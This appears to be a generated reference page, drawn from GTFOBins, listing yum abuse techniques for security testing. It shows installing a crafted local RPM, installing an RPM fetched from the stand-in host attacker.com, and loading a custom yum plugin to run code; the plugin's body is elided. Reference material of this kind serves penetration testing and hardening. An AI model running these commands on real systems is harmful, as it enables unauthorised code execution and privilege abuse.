---
parsed_by: focuslocust
source: commands
type: generated
---
# yum Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## yum

Tool page: [yum](../../tools/linux/yum.md)

### command

```text
yum localinstall -y x-1.0-1.noarch.rpm
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/yum` |
| Evidence | Function example preserved from source parser. |

### download

```text
yum install http://attacker.com/path/to/input-file.rpm
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/yum` |
| Evidence | Function example preserved from source parser. |

### inherit

```text
cat >/path/to/temp-dir/x<<EOF
[main]
plugins=1
pluginpath=/path/to/temp-dir/
pluginconfpath=/path/to/temp-dir/
EOF

cat >/path/to/temp-dir/y.conf<<EOF
[main]
enabled=1
EOF

cat >/path/to/temp-dir/y.py<<EOF
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  ...
EOF

yum -c /path/to/temp-dir/x --enableplugin=y
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/yum` |
| Evidence | Function example preserved from source parser. |
